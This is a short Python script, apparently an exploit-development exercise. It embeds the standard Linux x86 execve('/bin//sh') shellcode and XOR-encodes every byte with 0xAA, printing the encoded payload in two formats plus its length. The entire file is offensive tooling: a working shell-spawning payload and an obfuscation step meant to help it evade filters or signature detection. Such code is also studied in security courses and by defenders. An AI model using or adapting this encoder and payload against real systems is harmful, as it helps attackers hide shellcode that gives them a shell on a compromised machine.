#!/usr/bin/python3

shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'

encoded = ""
encoded2 = ""

print('Encoded shellcode...')

for x in bytearray(shellcode):
	y = x ^ 0xAA
	encoded += '\\x'
	encoded += format(y,'02x')

	encoded2 += '0x'
	encoded2 += format(y,'02x') + ','	


print(encoded)
print(encoded2)
print('Len:', len(bytearray(shellcode)))
